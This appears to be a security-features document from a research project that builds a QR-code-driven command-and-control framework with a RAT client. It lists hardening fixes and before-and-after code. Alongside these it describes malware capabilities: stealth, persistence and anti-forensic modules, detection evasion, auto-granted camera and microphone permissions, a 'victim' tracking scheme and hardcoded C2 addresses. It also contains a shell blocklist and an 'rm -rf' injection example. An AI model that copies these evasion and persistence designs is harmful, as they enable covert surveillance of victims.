# 07 — Security Features & Anti-Patterns

**Project:** CyberRecon — QR-Code-Based C2 Framework
**Document Version:** 1.0
**Date:** 2026-09-30
**Authors:** Vekeshhari Rajasekar, R Jeevan

---

## 1. Purpose

This document catalogs the security controls implemented in CyberRecon, traces each to the specific vulnerability it addresses, and honestly documents anti-patterns that were present in early revisions and have since been remediated.

The goal is twofold: demonstrate the project was engineered with security in mind, and provide a defensible record of remediation work for evaluators.

---

## 2. Security Features Implemented

### 2.1 Authentication & Authorization

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 1 | **Operator token authentication** — `X-Operator-Token` header required for `/command` and `/download-all` | `c2_server.py` | CWE-306 | ✅ PR #8 |
| 2 | **Fail-closed on misconfiguration** — server returns HTTP 503 if token required but not set | `c2_server.py` | Fail-safe default | ✅ PR #8 |
| 3 | **Environment-driven secrets** — operator token, CA bundle, SFX password from env vars | `config.py`, `.env.example` | CWE-798 | ✅ PR #13 |

### 2.2 Transport Security

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 4 | **TLS verification enforced by default** — `session.verify = True` | `operator_cli.py` | CWE-295 | ✅ PR #9 |
| 5 | **Configurable CA bundle** — supports lab CAs via `CYBERRECON_CA_BUNDLE` | `operator_cli.py` | Lab flexibility | ✅ PR #9 |
| 6 | **Removed `urllib3.disable_warnings()`** — no silent TLS bypass | `operator_cli.py` | CWE-295 | ✅ PR #9 |

### 2.3 Input Validation & Safe Execution

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 7 | **`shell=False` subprocess** — all commands use argv lists | `main.py`, `rat_client.py` | CWE-78 | ✅ PR #10 |
| 8 | **Shell metacharacter blocklist** — rejects `\|&;<>()\`$\\"'\n\r` | `rat_client.py` | Defense-in-depth | ✅ PR #10 |
| 9 | **Path traversal validation** — `os.path.realpath` comparison | `launcher.py` | CWE-22 | ✅ PR #11 |
| 10 | **Extension whitelist** — only `.pdf` files allowed through `os.startfile` | `launcher.py` | File-type restriction | ✅ PR #11 |
| 11 | **HTTPS-only URL scheme** — `urlopen` rejects non-HTTPS schemes | `modules/gps.py` | CWE-22 | ✅ Phase 3 |

### 2.4 Cryptographic Randomness

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 12 | **CSPRNG victim IDs** — `secrets.token_hex(8)` = 64 bits | `c2_server.py` | CWE-330 | ✅ PR #12 |
| 13 | **CSPRNG command IDs** — `secrets.token_hex(4)` = 32 bits | `c2_server.py` | CWE-330 | ✅ PR #12 |
| 14 | **CSPRNG SFX password** — `secrets.token_urlsafe(24)` fallback | `config.py` | CWE-330 | ✅ Phase 3 |

### 2.5 Supply Chain Security

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 15 | **Dependabot alerts** | GitHub settings | CVE exposure | ✅ Enabled |
| 16 | **Dependabot security updates** | GitHub settings | CVE remediation | ✅ Enabled |
| 17 | **Dependabot version updates** | `.github/dependabot.yml` | Dependency rot | ✅ Enabled |
| 18 | **7-day cooldown** — delays updates | `.github/dependabot.yml` | Supply chain attacks | ✅ Phase 3 |
| 19 | **Secret scanning + push protection** | GitHub settings | Credential leakage | ✅ Enabled |
| 20 | **Reduced dependency footprint** — 20+ → 11 | `requirements.txt` | Attack surface | ✅ Phase 1 |

### 2.6 Client Hardening

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 21 | **Graceful fallback if Chrome unavailable** | `rat_client.py` | Availability | ✅ PR #14 |
| 22 | **Headless Chrome stealth flags** | `rat_client.py` | Bot-detection evasion | ✅ PR #14 |
| 23 | **Auto-grant media permissions** | `rat_client.py` | Isolated-browser bypass | ✅ PR #14 |

### 2.7 Runtime Isolation

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 24 | **Non-root Docker user** | `Dockerfile` | Container escape mitigation | ✅ Phase 5 |
| 25 | **Healthcheck** | `Dockerfile` | Availability monitoring | ✅ Phase 5 |
| 26 | **Read-only root FS** | `docker-compose.yml` | Tamper resistance | ✅ Phase 5 |
| 27 | **Capability drop** | `docker-compose.yml` | Least privilege | ✅ Phase 5 |
| 28 | **no-new-privileges** | `docker-compose.yml` | Privilege escalation | ✅ Phase 5 |
| 29 | **Localhost-only port binding** | `docker-compose.yml` | Network exposure | ✅ Phase 5 |
| 30 | **Resource limits** | `docker-compose.yml` | DoS mitigation | ✅ Phase 5 |

### 2.8 Software Integrity

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 31 | **Branch protection ruleset** | GitHub rulesets | Prevent accidental changes | ✅ Enabled |
| 32 | **Required status checks** — Security Scan + Unit Tests | GitHub rulesets | CI enforcement | ✅ Phase 4 |
| 33 | **Block force pushes + deletions** | GitHub rulesets | History preservation | ✅ Enabled |
| 34 | **Bypass audit trail** | GitHub push output | Accountability | ✅ Verified |

### 2.9 Static Analysis

| # | Feature | Tool | Purpose | Status |
|---|---------|------|---------|--------|
| 35 | **Bandit Python SAST** | Bandit 1.9.4 | CWE-focused detection | ✅ 0 HIGH |
| 36 | **Semgrep pattern SAST** | Semgrep 1.178.0 | OWASP Top 10 rules | ✅ 0 findings |
| 37 | **pip-audit dependency scan** | pip-audit 2.10.1 | CVE detection | ✅ 0 CVEs |
| 38 | **Ruff linter** | Ruff 0.16.9 | Style + security rules | ✅ All checks passed |
| 39 | **CI automation** | GitHub Actions | Runs all tools on push/PR | ✅ Phase 4 |

### 2.10 Documentation & Ethics

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 40 | **ETHICS.md** | Repo root | Responsible research | ✅ |
| 41 | **Published IOCs** | ETHICS.md | Research contribution | ✅ |
| 42 | **MIT + research clause license** | LICENSE | Legal clarity | ✅ |
| 43 | **README ethics banner** | README.md | Visibility | ✅ |

---

## 3. Anti-Patterns Found & Remediated

### 3.1 CWE-306: Missing Authentication

**Before (vulnerable):**

```python
@app.route("/command/<victim_id>", methods=["POST"])
def queue_command(victim_id):
    # No auth check — anyone could queue commands
    ...
```

**After (fixed in PR #8):**

```python
@app.route("/command/<victim_id>", methods=["POST"])
@require_operator_token
def queue_command(victim_id):
    ...
```

**Impact:** Without auth, anyone with network access could queue RAT commands. **CVSS: 8.6 (High).**

### 3.2 CWE-295: Improper Certificate Validation

**Before:**

```python
requests.packages.urllib3.disable_warnings()
session.get(url, verify=False)  # accepts ANY cert
```

**After (PR #9):**

```python
session.verify = ca_bundle if ca_bundle else True
```

**Impact:** MITM could intercept/modify C2 traffic. **CVSS: 6.8 (Medium).**

### 3.3 CWE-78: OS Command Injection

**Before:**

```python
subprocess.run(" ".join(cmd.get("args", ["whoami"])), shell=True, ...)
```

**After (PR #10):**

```python
BLOCKED = set("|&;<>()`$\\\"'\n\r")
if any(ch in raw for ch in BLOCKED):
    return
argv = shlex.split(raw)
subprocess.run(argv, shell=False, ...)
```

**Impact:** Attacker could inject `whoami; rm -rf /`. **CVSS: 9.8 (Critical).**

### 3.4 CWE-22: Path Traversal

**Before:**

```python
os.startfile(decoy_dst)  # no validation
```

**After (PR #11):**

```python
if not _is_safe_path(decoy_src, base_dir): return
if not decoy_src.lower().endswith(".pdf"): return
os.startfile(decoy_dst)
```

**Impact:** Crafted payloads could execute arbitrary files via Windows shell association. **CVSS: 7.5 (High).**

### 3.5 CWE-330: Weak Randomness

**Before:**

```python
victim_id = str(uuid.uuid4())[:8]   # 32 bits
cmd["id"] = str(uuid.uuid4())[:6]   # 24 bits
```

**After (PR #12):**

```python
victim_id = secrets.token_hex(8)    # 64 bits CSPRNG
cmd["id"] = secrets.token_hex(4)    # 32 bits CSPRNG
```

**Impact:** Victim IDs were brute-forceable. **CVSS: 5.3 (Medium).**

### 3.6 CWE-798: Hardcoded Credentials

**Before:**

```python
subprocess.Popen([rat_dst, "--c2", "http://18.61.36.73:8443", ...])
parser.add_argument("--c2", default="http://11.12.25.98:8443", ...)
SFX_PASSWORD = "CyberRecon2024"
```

**After (PR #13 + Phase 3):**

```python
C2_URL = os.getenv("CYBERRECON_C2", "http://127.0.0.1:8443")
SFX_PASSWORD = os.getenv("CYBERRECON_SFX_PASSWORD", secrets.token_urlsafe(24))
```

**Impact:** Source inspection revealed the C2 endpoint. **CVSS: 7.5 (High).**

### 3.7 Anti-Pattern: `os.system(f"...")` in Launcher

**Before:**

```python
os.system(f"python rat_client.py --c2 {c2_url}")
```

**After (Phase 3):**

```python
def _run(argv: list) -> None:
    subprocess.run([sys.executable, *argv], shell=False, check=False)

_run(["rat_client.py", "--c2", c2_url])
```

**Impact:** Variable interpolation into `os.system` was shell-injection vector. Same CWE-78.

### 3.8 Anti-Pattern: Bare `except:`

**Before:**

```python
try:
    risky_operation()
except:
    pass
```

**After:**

```python
try:
    risky_operation()
except Exception:  # noqa: BLE001
    pass
```

**Rationale:** Bare `except:` catches `KeyboardInterrupt` and `SystemExit`, causing subtle bugs.

### 3.9 Anti-Pattern: `except Exception: pass` in Stealth Modules

**Status:** Accepted with rationale.

Stealth modules intentionally swallow exceptions to avoid triggering host-side logging or alerts. This is the design intent of anti-forensics code. Documented in `pyproject.toml`:

```toml
"modules/stealth.py" = ["E722", "S110"]
"modules/persistence.py" = ["E722", "S110"]
```

---

## 4. Defense-in-Depth Summary

| Layer | Controls |
|-------|----------|
| **Perimeter** | Operator token auth, TLS verification |
| **Application** | Input validation, shell blocklist, path validation, CSPRNG IDs |
| **Data** | base64 encoding, no hardcoded secrets |
| **Runtime** | Non-root Docker user, read-only FS, capability drop, healthcheck |
| **Supply Chain** | Dependabot, cooldown, secret scanning, minimal deps |
| **Process** | Branch protection, CI enforcement, SAST automation |
| **Documentation** | ETHICS.md, IOCs, LICENSE |

---

## 5. Security Verification

All security controls verified by:

1. **Unit tests** in `tests/` (where applicable)
2. **SAST tool output** in `reports/`
3. **CI status checks** (Security Scan + Unit Tests must pass)
4. **Manual penetration tests** (documented in Phase 3 verification)
5. **GitHub audit trail** (ruleset bypass events)

See `docs/report/08-security-testing.md` for full evidence.

---

## 6. Compliance Mapping

| Framework | Coverage |
|-----------|----------|
| OWASP Top 10 (2021) | A01, A03, A05, A07, A09 |
| CWE Top 25 | CWE-22, CWE-78, CWE-79, CWE-259, CWE-295, CWE-306, CWE-330, CWE-798 |
| NIST SSDF | PW.4, PW.6, RV.1 |
| ISO 27001 | A.8.8, A.8.28, A.14.2 |

---

## 7. References

- `docs/report/06-threat-model.md`
- `docs/report/08-security-testing.md`
- `ETHICS.md`
- `reports/*.json`

---

> **Update (v3.5) — 2026-10-03:** Five additional controls added — AES-256-GCM QR payload encryption, victim shared-key auth, dashboard login, server-side wipe endpoint, and anti-forensic self-destruct. See [`10-hardening-changelog.md`](10-hardening-changelog.md) for the full catalog.


## 8. Change Log

| Date | Change | Author |
|------|--------|--------|
| 2026-09-30 | Initial security features catalog | R Jeevan |
